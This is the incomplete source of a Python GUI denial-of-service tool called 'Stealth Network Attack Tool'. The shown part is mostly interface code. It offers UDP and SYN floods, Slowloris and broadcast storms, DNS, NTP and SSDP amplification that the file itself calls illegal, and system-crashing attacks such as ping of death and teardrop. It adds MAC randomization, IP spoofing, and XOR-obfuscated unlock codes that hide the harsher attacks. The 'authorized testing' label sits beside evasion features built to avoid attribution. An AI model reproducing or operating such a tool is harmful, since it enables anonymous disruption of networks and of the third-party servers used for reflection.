#!/usr/bin/env python3
"""
Stealth WiFi Jammer - Windows Edition
Single file, no external dependencies, maximum anonymity
For Red Team vs Blue Team competitions
"""

import tkinter as tk
from tkinter import ttk, messagebox
import socket
import random
import threading
import time
import subprocess
import os
import sys
import ctypes
import re
import struct
import platform

class StealthJammer(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("Stealth Network Attack Tool - Windows Edition")
        
        # Set window to 90% of screen size
        screen_width = self.winfo_screenwidth()
        screen_height = self.winfo_screenheight()
        window_width = int(screen_width * 0.9)
        window_height = int(screen_height * 0.9)
        x = (screen_width - window_width) // 2
        y = (screen_height - window_height) // 2
        self.geometry(f"{window_width}x{window_height}+{x}+{y}")
        self.resizable(True, True)
        
        # Configure colors and theme
        self.bg_color = "#1e1e1e"
        self.fg_color = "#ffffff"
        self.accent_color = "#007acc"
        self.danger_color = "#e74c3c"
        self.success_color = "#2ecc71"
        self.warning_color = "#f39c12"
        
        self.configure(bg=self.bg_color)
        
        # Attack state
        self.attack_active = False
        self.intensity = 5
        self.attack_threads = []
        self.packets_sent = 0
        self.start_time = None
        self.bytes_sent = 0
        
        # Advanced customization settings
        self.packet_size_min = 512
        self.packet_size_max = 2048
        self.send_rate = 1000  # packets per second per thread
        self.burst_size = 10
        self.thread_multiplier = 5
        
        # Packet preloading
        self.preloaded_packets = []
        self.preload_count = 1000  # Number of packets to preload
        self.preload_enabled = True
        
        # Performance monitoring
        self.last_packet_count = 0
        self.last_byte_count = 0
        self.last_update_time = time.time()
        self.current_pps = 0  # packets per second
        self.current_bandwidth = 0  # bytes per second
        
        # Ping monitoring
        self.ping_target = "8.8.8.8"
        self.current_ping = 0
        self.ping_monitoring = False
        
        # Anonymity features
        self.mac_randomization = False
        self.traffic_obfuscation = True
        
        # Network info
        self.current_interface = None
        self.current_mac = None
        self.original_mac = None
        self.spoofed_ip = None
        self.spoofed_mac = None
        
        # Secret unlock for destructive attacks
        self.destructive_unlocked = False
        self.secret_sequence = []
        # Obfuscated code - XOR with 5 to hide the real values
        _enc = [2, 6, 7, 12, 4, 1, 13, 3]
        self.secret_code = [x ^ 5 for x in _enc]  # Decode at runtime
        self.failed_attempts = 0
        
        # Secret unlock for amplification (illegal) attacks
        self.amplification_unlocked = False
        self.amp_sequence = []
        # Different obfuscation - XOR with 7
        _amp_enc = [6, 7, 4, 0, 2, 6]
        self.amp_code = [x ^ 7 for x in _amp_enc]  # Decode at runtime
        self.amp_failed_attempts = 0
        
        # Check for admin privileges
        self.is_admin = self.check_admin()
        
        self.build_ui()
        self.detect_network_interface()
        
        # Start monitoring
        self.update_stats()
        self.start_ping_monitor()
        
        self.protocol("WM_DELETE_WINDOW", self.on_destroy)
    
    def check_admin(self):
        """Check if running with admin privileges on Windows"""
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            return False
    
    def build_ui(self):
        # Configure modern dark theme
        style = ttk.Style()
        style.theme_use('clam')
        
        # Configure ttk styles for dark theme
        style.configure('TFrame', background=self.bg_color)
        style.configure('TLabel', background=self.bg_color, foreground=self.fg_color)
        style.configure('TLabelframe', background=self.bg_color, foreground=self.fg_color)
        style.configure('TLabelframe.Label', background=self.bg_color, foreground=self.accent_color, font=('Segoe UI', 11, 'bold'))
        style.configure('TCheckbutton', background=self.bg_color, foreground=self.fg_color)
        style.configure('Header.TLabel', font=('Segoe UI', 24, 'bold'), foreground=self.accent_color)
        style.configure('Subheader.TLabel', font=('Segoe UI', 10), foreground='#cccccc')
        style.configure('Stat.TLabel', font=('Consolas', 12, 'bold'), foreground=self.success_color)
        style.configure('Warning.TLabel', font=('Segoe UI', 10, 'bold'), foreground=self.warning_color)
        
        # Main container with canvas for scrolling
        self.grid_rowconfigure(0, weight=1)
        self.grid_columnconfigure(0, weight=1)
        
        # Create canvas and scrollbar for left column
        canvas_container = tk.Frame(self, bg=self.bg_color)
        canvas_container.grid(row=0, column=0, sticky='nsew')
        canvas_container.grid_rowconfigure(0, weight=1)
        canvas_container.grid_columnconfigure(0, weight=1)
        canvas_container.grid_columnconfigure(1, weight=1)
        
        # Left canvas with scrollbar
        left_canvas = tk.Canvas(canvas_container, bg=self.bg_color, highlightthickness=0)
        left_scrollbar = ttk.Scrollbar(canvas_container, orient="vertical", command=left_canvas.yview)
        left_scrollable = ttk.Frame(left_canvas)
        
        left_scrollable.bind("<Configure>", lambda e: left_canvas.configure(scrollregion=left_canvas.bbox("all")))
        left_canvas.create_window((0, 0), window=left_scrollable, anchor="nw")
        left_canvas.configure(yscrollcommand=left_scrollbar.set)
        
        # Right canvas with scrollbar
        right_canvas = tk.Canvas(canvas_container, bg=self.bg_color, highlightthickness=0)
        right_scrollbar = ttk.Scrollbar(canvas_container, orient="vertical", command=right_canvas.yview)
        right_scrollable = ttk.Frame(right_canvas)
        
        right_scrollable.bind("<Configure>", lambda e: right_canvas.configure(scrollregion=right_canvas.bbox("all")))
        right_canvas.create_window((0, 0), window=right_scrollable, anchor="nw")
        right_canvas.configure(yscrollcommand=right_scrollbar.set)
        
        # Grid layout
        left_canvas.grid(row=0, column=0, sticky='nsew', padx=(10, 5), pady=10)
        left_scrollbar.grid(row=0, column=0, sticky='nse', padx=(0, 5))
        right_canvas.grid(row=0, column=1, sticky='nsew', padx=(5, 10), pady=10)
        right_scrollbar.grid(row=0, column=1, sticky='nse', padx=(0, 10))
        
        # Mouse wheel scrolling - bind to each canvas separately
        def scroll_left(event):
            left_canvas.yview_scroll(int(-1*(event.delta/120)), "units")
            return "break"
        
        def scroll_right(event):
            right_canvas.yview_scroll(int(-1*(event.delta/120)), "units")
            return "break"
        
        # Bind mouse wheel to canvases when mouse enters
        left_canvas.bind("<Enter>", lambda e: left_canvas.bind_all("<MouseWheel>", scroll_left))
        left_canvas.bind("<Leave>", lambda e: left_canvas.unbind_all("<MouseWheel>"))
        right_canvas.bind("<Enter>", lambda e: right_canvas.bind_all("<MouseWheel>", scroll_right))
        right_canvas.bind("<Leave>", lambda e: right_canvas.unbind_all("<MouseWheel>"))
        
        # Header Section (spans both columns)
        header_container = tk.Frame(self, bg=self.bg_color)
        header_container.grid(row=0, column=0, sticky='new', padx=10, pady=(10, 0))
        
        main_frame = ttk.Frame(left_scrollable, padding=5)
        main_frame.pack(fill='both', expand=True)
        
        right_main_frame = ttk.Frame(right_scrollable, padding=5)
        right_main_frame.pack(fill='both', expand=True)
        
        right_main_frame = ttk.Frame(right_scrollable, padding=5)
        right_main_frame.pack(fill='both', expand=True)
        
        # Header Section
        header_frame = ttk.Frame(main_frame)
        header_frame.pack(fill='x', pady=(0, 10))
        
        title_label = ttk.Label(header_frame, text="STEALTH NETWORK ATTACK TOOL", style='Header.TLabel')
        title_label.pack()
        
        subtitle_label = ttk.Label(header_frame, text="Red Team Edition - Authorized Testing Only", style='Subheader.TLabel')
        subtitle_label.pack()
        
        warning_frame = tk.Frame(header_frame, bg=self.danger_color, bd=0)
        warning_frame.pack(fill='x', pady=5)
        warning_label = tk.Label(warning_frame, text="WARNING: Red Team Mode Active - Maximum Stealth Engaged",
                                font=('Segoe UI', 10, 'bold'), fg='white', bg=self.danger_color, pady=5)
        warning_label.pack()
        
        # Left Column - Controls
        left_column = main_frame
        
        # Right Column - Statistics
        right_column = right_main_frame
        
        # === LEFT COLUMN CONTENT ===
        
        # Anonymity Controls
        anon_frame = ttk.LabelFrame(left_column, text="ANONYMITY CONTROLS", padding=15)
        anon_frame.pack(fill='x', pady=(0, 10))
        
        # MAC Randomization
        mac_frame = ttk.Frame(anon_frame)
        mac_frame.pack(fill='x', pady=5)
        ttk.Label(mac_frame, text="MAC Address Randomization", font=('Segoe UI', 10)).pack(side='left')
        self.mac_var = tk.BooleanVar(value=False)
        self.mac_switch = ttk.Checkbutton(mac_frame, variable=self.mac_var, command=self.on_mac_toggle)
        self.mac_switch.pack(side='right')
        
        self.mac_status = ttk.Label(anon_frame, text="Current MAC: Detecting...", font=('Consolas', 9))
        self.mac_status.pack(anchor='w', pady=2)
        
        mac_btn = tk.Button(anon_frame, text="Generate New MAC Now", command=self.on_randomize_mac_now,
                           bg=self.accent_color, fg='white', font=('Segoe UI', 9), relief='flat', cursor='hand2')
        mac_btn.pack(fill='x', pady=5)
        
        ttk.Separator(anon_frame, orient='horizontal').pack(fill='x', pady=10)
        
        # Packet Spoofing
        spoof_label = ttk.Label(anon_frame, text="IP/Port Spoofing: ALWAYS ACTIVE", font=('Segoe UI', 10, 'bold'))
        spoof_label.pack(anchor='w', pady=2)
        
        self.spoof_status = ttk.Label(anon_frame, text="Spoofed IP: Generating...", font=('Consolas', 9))
        self.spoof_status.pack(anchor='w', pady=2)
        
        # Traffic Obfuscation
        obfus_frame = ttk.Frame(anon_frame)
        obfus_frame.pack(fill='x', pady=5)
        ttk.Label(obfus_frame, text="Traffic Pattern Randomization", font=('Segoe UI', 10)).pack(side='left')
        self.obfus_var = tk.BooleanVar(value=True)
        self.obfus_switch = ttk.Checkbutton(obfus_frame, variable=self.obfus_var, command=self.on_obfuscation_toggle)
        self.obfus_switch.pack(side='right')
        

        # Quick Mode Selector (Tab-style buttons)
        mode_selector_frame = ttk.Frame(left_column)
        mode_selector_frame.pack(fill='x', pady=(0, 10))
        
        mode_header = ttk.Frame(mode_selector_frame)
        mode_header.pack(fill='x', pady=(0, 5))
        ttk.Label(mode_header, text="Quick Mode:", font=('Segoe UI', 9, 'bold')).pack(side='left')
        tk.Button(mode_header, text="ⓘ", font=('Segoe UI', 8), bg='#2c2c2c', fg=self.accent_color,
                 relief='flat', cursor='hand2', width=2,
                 command=lambda: self.show_info("Quick Mode", 
                 "⚡ No Admin: Safe vectors only\n⚙️ Custom: Manual control\n\n🔒 Advanced attacks require passwords")).pack(side='left', padx=5)
        
        mode_buttons_frame = ttk.Frame(mode_selector_frame)
        mode_buttons_frame.pack(fill='x')
        
        self.mode_safe_btn = tk.Button(mode_buttons_frame, text="⚡ No Admin Required",
                                       command=self.set_safe_mode,
                                       bg='#2c5c2c', fg='white', font=('Segoe UI', 9, 'bold'),
                                       relief='flat', cursor='hand2', height=2,
                                       activebackground='#3d7d3d')
        self.mode_safe_btn.pack(side='left', padx=2, expand=True, fill='both')
        
        self.mode_custom_btn = tk.Button(mode_buttons_frame, text="⚙️ Custom",
                                         command=self.set_custom_mode,
                                         bg='#2c2c2c', fg='white', font=('Segoe UI', 9, 'bold'),
                                         relief='flat', cursor='hand2', height=2,
                                         activebackground='#4d4d4d')
        self.mode_custom_btn.pack(side='left', padx=2, expand=True, fill='both')
        
        # Attack Controls
        attack_frame = ttk.LabelFrame(left_column, text="ATTACK CONTROLS", padding=15)
        attack_frame.pack(fill='x', pady=(0, 10))
        
        # Attack toggle
        self.attack_button = tk.Button(attack_frame, text="START ATTACK",
                                      font=('Segoe UI', 14, 'bold'),
                                      bg=self.success_color, fg='white',
                                      command=self.on_attack_toggle,
                                      height=2, relief='flat', cursor='hand2')
        self.attack_button.pack(fill='x', pady=5)
        
        # Intensity presets
        preset_frame = ttk.Frame(attack_frame)
        preset_frame.pack(fill='x', pady=10)
        ttk.Label(preset_frame, text="Intensity Presets:", font=('Segoe UI', 10, 'bold')).pack(anchor='w', pady=5)
        
        preset_buttons = ttk.Frame(preset_frame)
        preset_buttons.pack(fill='x')
        
        for name, level in [("Low", 3), ("Medium", 5), ("High", 7), ("Maximum", 10)]:
            btn = tk.Button(preset_buttons, text=name, command=lambda l=level: self.on_preset_click(l),
                          bg='#2c2c2c', fg='white', font=('Segoe UI', 9), relief='flat', cursor='hand2')
            btn.pack(side='left', padx=2, expand=True, fill='x')
        
        # Custom intensity
        intensity_frame = ttk.Frame(attack_frame)
        intensity_frame.pack(fill='x', pady=10)
        
        intensity_header = ttk.Frame(intensity_frame)
        intensity_header.pack(fill='x')
        ttk.Label(intensity_header, text="Custom Intensity:", font=('Segoe UI', 10, 'bold')).pack(side='left')
        self.intensity_label = ttk.Label(intensity_header, text="Level 5 (50%)", font=('Segoe UI', 10, 'bold'),
                                        foreground=self.accent_color)
        self.intensity_label.pack(side='right')
        
        self.intensity_var = tk.IntVar(value=5)
        self.intensity_scale = ttk.Scale(intensity_frame, from_=1, to=10,
                                        variable=self.intensity_var,
                                        orient='horizontal',
                                        command=self.on_intensity_changed)
        self.intensity_scale.pack(fill='x', pady=5)
        
        # Attack vectors
        ttk.Label(attack_frame, text="Attack Vectors:", font=('Segoe UI', 10, 'bold')).pack(anchor='w', pady=(10, 5))
        
        # === STANDARD ATTACKS (No Admin Required) ===
        standard_label_frame = ttk.Frame(attack_frame)
        standard_label_frame.pack(fill='x', padx=10, pady=(5, 2))
        ttk.Label(standard_label_frame, text="⚡ Standard Attacks", 
                 font=('Segoe UI', 9, 'bold'), foreground='#4CAF50').pack(side='left')
        ttk.Label(standard_label_frame, text="(No Admin Required)", 
                 font=('Segoe UI', 8), foreground='#888888').pack(side='left', padx=5)
        
        vectors_frame = ttk.Frame(attack_frame)
        vectors_frame.pack(fill='x', padx=10)
        
        # UDP Flood
        udp_frame = ttk.Frame(vectors_frame)
        udp_frame.pack(fill='x', pady=2)
        self.vector_udp_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(udp_frame, text="UDP Flood", variable=self.vector_udp_var).pack(side='left')
        tk.Button(udp_frame, text="ⓘ", font=('Segoe UI', 8), bg='#2c2c2c', fg=self.accent_color,
                 relief='flat', cursor='hand2', width=2,
                 command=lambda: self.show_info("UDP Flood", "Floods target with UDP packets. High bandwidth saturation.")).pack(side='left', padx=5)
        
        # TCP SYN Flood
        tcp_frame = ttk.Frame(vectors_frame)
        tcp_frame.pack(fill='x', pady=2)
        self.vector_tcp_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(tcp_frame, text="TCP SYN Flood", variable=self.vector_tcp_var).pack(side='left')
        tk.Button(tcp_frame, text="ⓘ", font=('Segoe UI', 8), bg='#2c2c2c', fg=self.accent_color,
                 relief='flat', cursor='hand2', width=2,
                 command=lambda: self.show_info("TCP SYN Flood", "Exhausts connection table with half-open TCP connections.")).pack(side='left', padx=5)
        
        # Broadcast Storm
        bcast_frame = ttk.Frame(vectors_frame)
        bcast_frame.pack(fill='x', pady=2)
        self.vector_broadcast_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(bcast_frame, text="Broadcast Storm", variable=self.vector_broadcast_var).pack(side='left')
        tk.Button(bcast_frame, text="ⓘ", font=('Segoe UI', 8), bg='#2c2c2c', fg=self.accent_color,
                 relief='flat', cursor='hand2', width=2,
                 command=lambda: self.show_info("Broadcast Storm", "Floods entire network segment with broadcast packets.")).pack(side='left', padx=5)
        
        # Slowloris
        slow_frame = ttk.Frame(vectors_frame)
        slow_frame.pack(fill='x', pady=2)
        self.vector_slowloris_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(slow_frame, text="� Slowloris", variable=self.vector_slowloris_var).pack(side='left')
        tk.Button(slow_frame, text="ⓘ", font=('Segoe UI', 8), bg='#2c2c2c', fg=self.accent_color,
                 relief='flat', cursor='hand2', width=2,
                 command=lambda: self.show_info("Slowloris", "Opens hundreds of connections and keeps them alive with partial HTTP headers. Exhausts web servers.")).pack(side='left', padx=5)
        
        # Separator
        ttk.Separator(attack_frame, orient='horizontal').pack(fill='x', pady=10)
        
        # === AMPLIFICATION ATTACKS (Malicious - Reflects through 3rd parties) ===
        amp_section_frame = ttk.Frame(attack_frame)
        amp_section_frame.pack(fill='x', padx=10, pady=5)
        
        amplification_label_frame = ttk.Frame(amp_section_frame)
        amplification_label_frame.pack(fill='x', pady=(5, 2))
        ttk.Label(amplification_label_frame, text="⚠️ Amplification Attacks", 
                 font=('Segoe UI', 9, 'bold'), foreground='#FF9800').pack(side='left')
        ttk.Label(amplification_label_frame, text="(Reflects through 3rd parties - ILLEGAL)", 
                 font=('Segoe UI', 8), foreground='#FF5722').pack(side='left', padx=5)
        
        # Amplification unlock section
        amp_unlock_frame = ttk.Frame(amp_section_frame)
        amp_unlock_frame.pack(fill='x', pady=5)
        
        self.amp_unlock_label = ttk.Label(amp_unlock_frame, text="🔒 LOCKED - Type Password:", 
                                         font=('Segoe UI', 9, 'bold'), foreground='#FF9800')
        self.amp_unlock_label.pack(side='left')
        
        # Password entry field for amplification unlock
        self.amp_entry_var = tk.StringVar()
        self.amp_entry = tk.Entry(amp_unlock_frame, textvariable=self.amp_entry_var, 
                                 show="*", width=10, font=('Consolas', 12, 'bold'),
                                 bg='#3d2c1f', fg='#FF9800', insertbackground='#FF9800',
                                 relief='flat', justify='center')
        self.amp_entry.pack(side='left', padx=10)
        self.amp_entry.bind('<Return>', lambda e: self.check_amp_password())
        self.amp_entry.bind('<KeyRelease>', self.on_amp_entry_change)
        
        # Amplification attacks container (hidden until unlocked)
        self.amplification_container = ttk.Frame(amp_section_frame)
        # Don't pack yet - will pack when unlocked
        
        # DNS Amplification
        dns_frame = ttk.Frame(self.amplification_container)
        dns_frame.pack(fill='x', pady=2)
        self.vector_dns_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(dns_frame, text="🌐 DNS Amplification (70x)", variable=self.vector_dns_var).pack(side='left')
        tk.Button(dns_frame, text="ⓘ", font=('Segoe UI', 8), bg='#3d2c1f', fg='#FF9800',
                 relief='flat', cursor='hand2', width=2,
                 command=lambda: self.show_info("DNS Amplification", "Uses public DNS servers to amplify traffic 70x. Reflects to target. ILLEGAL!")).pack(side='left', padx=5)
        
        # NTP Amplification
        ntp_frame = ttk.Frame(self.amplification_container)
        ntp_frame.pack(fill='x', pady=2)
        self.vector_ntp_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(ntp_frame, text="⏰ NTP Amplification (556x)", variable=self.vector_ntp_var).pack(side='left')
        tk.Button(ntp_frame, text="ⓘ", font=('Segoe UI', 8), bg='#3d2c1f', fg='#FF9800',
                 relief='flat', cursor='hand2', width=2,
                 command=lambda: self.show_info("NTP Amplification", "Exploits NTP monlist command. 556x amplification factor! ILLEGAL!")).pack(side='left', padx=5)
        
        # SSDP Amplification
        ssdp_frame = ttk.Frame(self.amplification_container)
        ssdp_frame.pack(fill='x', pady=2)
        self.vector_ssdp_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(ssdp_frame, text="📡 SSDP Amplification (30x)", variable=self.vector_ssdp_var).pack(side='left')
        tk.Button(ssdp_frame, text="ⓘ", font=('Segoe UI', 8), bg='#3d2c1f', fg='#FF9800',
                 relief='flat', cursor='hand2', width=2,
                 command=lambda: self.show_info("SSDP Amplification", "Exploits UPnP discovery. Reflects off IoT devices. 30x amplification. ILLEGAL!")).pack(side='left', padx=5)
        
        # Separator
        ttk.Separator(attack_frame, orient='horizontal').pack(fill='x', pady=10)
        
        # === DESTRUCTIVE ATTACKS (Requires Admin - Can Crash Systems) ===
        destructive_section_frame = ttk.Frame(attack_frame)
        destructive_section_frame.pack(fill='x', padx=10, pady=5)
        
        destructive_label_frame = ttk.Frame(destructive_section_frame)
        destructive_label_frame.pack(fill='x', pady=(5, 2))
        ttk.Label(destructive_label_frame, text="💀 Destructive Attacks", 
                 font=('Segoe UI', 9, 'bold'), foreground='#F44336').pack(side='left')
        ttk.Label(destructive_label_frame, text="(Requires Admin - Can CRASH systems)", 
                 font=('Segoe UI', 8), foreground='#D32F2F').pack(side='left', padx=5)
        
        # Destructive unlock section
        dest_unlock_frame = ttk.Frame(destructive_section_frame)
        dest_unlock_frame.pack(fill='x', pady=5)
        
        self.unlock_label = ttk.Label(dest_unlock_frame, text="🔒 LOCKED - Type Password:", 
                                     font=('Segoe UI', 9, 'bold'), foreground='#F44336')
        self.unlock_label.pack(side='left')
        
        # Password entry field for destructive unlock
        self.dest_entry_var = tk.StringVar()
        self.dest_entry = tk.Entry(dest_unlock_frame, textvariable=self.dest_entry_var, 
                                  show="*", width=12, font=('Consolas', 12, 'bold'),
                                  bg='#5c2c2c', fg='#ff6666', insertbackground='#ff6666',
                                  relief='flat', justify='center')
        self.dest_entry.pack(side='left', padx=10)
        self.dest_entry.bind('<Return>', lambda e: self.check_dest_password())
        self.dest_entry.bind('<KeyRelease>', self.on_dest_entry_change)
        
        # Destructive attacks container (hidden until unlocked)
        self.destructive_container = ttk.Frame(destructive_section_frame)
        # Don't pack yet - will pack when unlocked
        
        # IP Fragmentation Bomb
        frag_frame = ttk.Frame(self.destructive_container)
        frag_frame.pack(fill='x', pady=2)
        self.vector_fragmentation_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(frag_frame, text="� IP Fragmentation Bomb", variable=self.vector_fragmentation_var).pack(side='left')
        tk.Button(frag_frame, text="ⓘ", font=('Segoe UI', 8), bg='#5c2c2c', fg='#ff6666',
                 relief='flat', cursor='hand2', width=2,
                 command=lambda: self.show_info("Fragmentation Bomb (ADMIN)", "Sends malformed overlapping fragments. Crashes routers/firewalls. Requires admin.")).pack(side='left', padx=5)
        
        # Ping of Death
        pod_frame = ttk.Frame(self.destructive_container)
        pod_frame.pack(fill='x', pady=2)
        self.vector_ping_death_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(pod_frame, text="💀 Ping of Death", variable=self.vector_ping_death_var).pack(side='left')
        tk.Button(pod_frame, text="ⓘ", font=('Segoe UI', 8), bg='#5c2c2c', fg='#ff6666',
                 relief='flat', cursor='hand2', width=2,
                 command=lambda: self.show_info("Ping of Death (ADMIN)", "Sends oversized ICMP packets (>65KB). Crashes legacy systems. Requires admin.")).pack(side='left', padx=5)
        
        # LAND Attack
        land_frame = ttk.Frame(self.destructive_container)
        land_frame.pack(fill='x', pady=2)
        self.vector_land_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(land_frame, text="🌍 LAND Attack", variable=self.vector_land_var).pack(side='left')
        tk.Button(land_frame, text="ⓘ", font=('Segoe UI', 8), bg='#5c2c2c', fg='#ff6666',
                 relief='flat', cursor='hand2', width=2,
                 command=lambda: self.show_info("LAND Attack (ADMIN)", "Source IP = Destination IP. Creates infinite loops, freezes systems. Requires admin.")).pack(side='left', padx=5)
        
        # Teardrop Attack
        tear_frame = ttk.Frame(self.destructive_container)
        tear_frame.pack(fill='x', pady=2)
        self.vector_teardrop_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(tear_frame, text="💧 Teardrop Attack", variable=self.vector_teardrop_var).pack(side='left')
        tk.Button(tear_frame, text="ⓘ", font=('Segoe UI', 8), bg='#5c2c2c', fg='#ff6666',
                 relief='flat', cursor='hand2', width=2,
                 command=lambda: self.show_info("Teardrop (ADMIN)", "Overlapping IP fragments. Crashes systems on reassembly. Requires admin.")).pack(side='left', padx=5)
        
        # Separator
        ttk.Separator(attack_frame, orient='horizontal').pack(fill='x', pady=10)
        
        # Advanced Configuration
        advanced_frame = ttk.LabelFrame(left_column, text="ADVANCED CONFIGURATION", padding=15)
        advanced_frame.pack(fill='x', pady=(0, 10))
        
        # Packet Size Configuration
        ttk.Label(advanced_frame, text="Packet Size Control:", font=('Segoe UI', 10, 'bold')).pack(anchor='w', pady=(5, 2))
        
        size_container = ttk.Frame(advanced_frame)
        size_container.pack(fill='x', pady=5)
        
        size_min_frame = ttk.Frame(size_container)
        size_min_frame.pack(fill='x', pady=2)
        ttk.Label(size_min_frame, text="Min Size (bytes):", font=('Segoe UI', 9)).pack(side='left')
        self.packet_size_min_var = tk.IntVar(value=512)
        size_min_spin = tk.Spinbox(size_min_frame, from_=64, to=1048576, increment=64,
                                   textvariable=self.packet_size_min_var, font=('Consolas', 9),
                                   width=8, command=self.update_packet_size)
        size_min_spin.pack(side='right')
        
        size_max_frame = ttk.Frame(size_container)
        size_max_frame.pack(fill='x', pady=2)
        ttk.Label(size_max_frame, text="Max Size (bytes):", font=('Segoe UI', 9)).pack(side='left')
        self.packet_size_max_var = tk.IntVar(value=2048)
        size_max_spin = tk.Spinbox(size_max_frame, from_=64, to=1048576, increment=64,
                                   textvariable=self.packet_size_max_var, font=('Consolas', 9),
                                   width=8, command=self.update_packet_size)
        size_max_spin.pack(side='right')
        
        # Packet size presets
        size_preset_frame = ttk.Frame(advanced_frame)
        size_preset_frame.pack(fill='x', pady=5)
        ttk.Label(size_preset_frame, text="Size Presets:", font=('Segoe UI', 9)).pack(side='left', padx=(0, 5))
        
        size_preset_row1 = ttk.Frame(size_preset_frame)
        size_preset_row1.pack(fill='x', pady=2)
        
        for name, min_s, max_s in [("Tiny", 64, 256), ("Small", 256, 512), ("Medium", 512, 2048)]:
            btn = tk.Button(size_preset_row1, text=name, 
                          command=lambda m=min_s, x=max_s: self.set_packet_size_preset(m, x),
                          bg='#2c2c2c', fg='white', font=('Segoe UI', 8), relief='flat', cursor='hand2')
            btn.pack(side='left', padx=1, expand=True, fill='x')
        
        size_preset_row2 = ttk.Frame(size_preset_frame)
        size_preset_row2.pack(fill='x', pady=2)
        
        for name, min_s, max_s in [("Large", 2048, 8192), ("Huge", 8192, 65536), ("1 MB", 1048576, 1048576)]:
            btn = tk.Button(size_preset_row2, text=name, 
                          command=lambda m=min_s, x=max_s: self.set_packet_size_preset(m, x),
                          bg='#2c2c2c', fg='white', font=('Segoe UI', 8), relief='flat', cursor='hand2')
            btn.pack(side='left', padx=1, expand=True, fill='x')

        
        ttk.Separator(advanced_frame, orient='horizontal').pack(fill='x', pady=10)
        
        # Send Rate Configuration
        ttk.Label(advanced_frame, text="Send Rate Control:", font=('Segoe UI', 10, 'bold')).pack(anchor='w', pady=(5, 2))
        
        rate_frame = ttk.Frame(advanced_frame)
        rate_frame.pack(fill='x', pady=5)
        
        rate_header = ttk.Frame(rate_frame)
        rate_header.pack(fill='x')
        ttk.Label(rate_header, text="Packets/sec per thread:", font=('Segoe UI', 9)).pack(side='left')
        self.rate_value_label = ttk.Label(rate_header, text="1000", font=('Segoe UI', 9, 'bold'),
                                         foreground=self.accent_color)
        self.rate_value_label.pack(side='right')
        
        self.send_rate_var = tk.IntVar(value=1000)
        rate_scale = ttk.Scale(rate_frame, from_=100, to=10000, variable=self.send_rate_var,
                              orient='horizontal', command=self.update_send_rate)
        rate_scale.pack(fill='x', pady=2)
        
        # Rate presets
        rate_preset_frame = ttk.Frame(advanced_frame)
        rate_preset_frame.pack(fill='x', pady=5)
        ttk.Label(rate_preset_frame, text="Rate Presets:", font=('Segoe UI', 9)).pack(side='left', padx=(0, 5))
        
        for name, rate in [("Slow", 100), ("Normal", 1000), ("Fast", 5000), ("MAX", 10000)]:
            btn = tk.Button(rate_preset_frame, text=name,
                          command=lambda r=rate: self.send_rate_var.set(r) or self.update_send_rate(r),
                          bg='#2c2c2c', fg='white', font=('Segoe UI', 8), relief='flat', cursor='hand2')
            btn.pack(side='left', padx=1, expand=True, fill='x')
        
        ttk.Separator(advanced_frame, orient='horizontal').pack(fill='x', pady=10)
        
        # Burst Size Configuration
        ttk.Label(advanced_frame, text="Burst Size:", font=('Segoe UI', 10, 'bold')).pack(anchor='w', pady=(5, 2))
        
        burst_frame = ttk.Frame(advanced_frame)
        burst_frame.pack(fill='x', pady=5)
        
        burst_header = ttk.Frame(burst_frame)
        burst_header.pack(fill='x')
        ttk.Label(burst_header, text="Packets per burst:", font=('Segoe UI', 9)).pack(side='left')
        self.burst_value_label = ttk.Label(burst_header, text="10", font=('Segoe UI', 9, 'bold'),
                                          foreground=self.accent_color)
        self.burst_value_label.pack(side='right')
        
        self.burst_size_var = tk.IntVar(value=10)
        burst_scale = ttk.Scale(burst_frame, from_=1, to=100, variable=self.burst_size_var,
                               orient='horizontal', command=self.update_burst_size)
        burst_scale.pack(fill='x', pady=2)
        
        ttk.Separator(advanced_frame, orient='horizontal').pack(fill='x', pady=10)
        
        # Thread Multiplier
        ttk.Label(advanced_frame, text="Thread Multiplier:", font=('Segoe UI', 10, 'bold')).pack(anchor='w', pady=(5, 2))
        
        thread_frame = ttk.Frame(advanced_frame)
        thread_frame.pack(fill='x', pady=5)
        
        thread_header = ttk.Frame(thread_frame)
        thread_header.pack(fill='x')
        ttk.Label(thread_header, text="Threads per intensity:", font=('Segoe UI', 9)).pack(side='left')
        tk.Button(thread_header, text="ⓘ", font=('Segoe UI', 7), bg='#2c2c2c', fg=self.accent_color,
                 relief='flat', cursor='hand2', width=2,
                 command=lambda: self.show_info("Thread Multiplier", 
                 "Higher = More parallel threads.\n20x at intensity 10 = 200 simultaneous threads!\nMore CPU usage but devastating performance.")).pack(side='left', padx=3)
        self.thread_value_label = ttk.Label(thread_header, text="5x", font=('Segoe UI', 9, 'bold'),
                                           foreground=self.accent_color)
        self.thread_value_label.pack(side='right')
        
        self.thread_multiplier_var = tk.IntVar(value=5)
        thread_scale = ttk.Scale(thread_frame, from_=1, to=20, variable=self.thread_multiplier_var,
                                orient='horizontal', command=self.update_thread_multiplier)
        thread_scale.pack(fill='x', pady=2)
        
        ttk.Separator(advanced_frame, orient='horizontal').pack(fill='x', pady=10)
        
        # Packet Preloading
        preload_header = ttk.Frame(advanced_frame)
        preload_header.pack(fill='x', pady=(5, 2))
        ttk.Label(preload_header, text="Packet Preloading:", font=('Segoe UI', 10, 'bold')).pack(side='left')
        tk.Button(preload_header, text="ⓘ", font=('Segoe UI', 8), bg='#2c2c2c', fg=self.accent_color,
                 relief='flat', cursor='hand2', width=2,
                 command=lambda: self.show_info("Packet Preloading", 
                 "Generates packets in RAM before attack.\n∞ Infinite: Keeps generating until memory full.\nFaster attacks with zero generation delay!")).pack(side='left', padx=5)
        
        preload_enable_frame = ttk.Frame(advanced_frame)
        preload_enable_frame.pack(fill='x', pady=5)
        ttk.Label(preload_enable_frame, text="Enable Preloading", font=('Segoe UI', 9)).pack(side='left')
        self.preload_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(preload_enable_frame, variable=self.preload_var,
                       command=self.update_preload_setting).pack(side='right')
        
        infinite_preload_frame = ttk.Frame(advanced_frame)
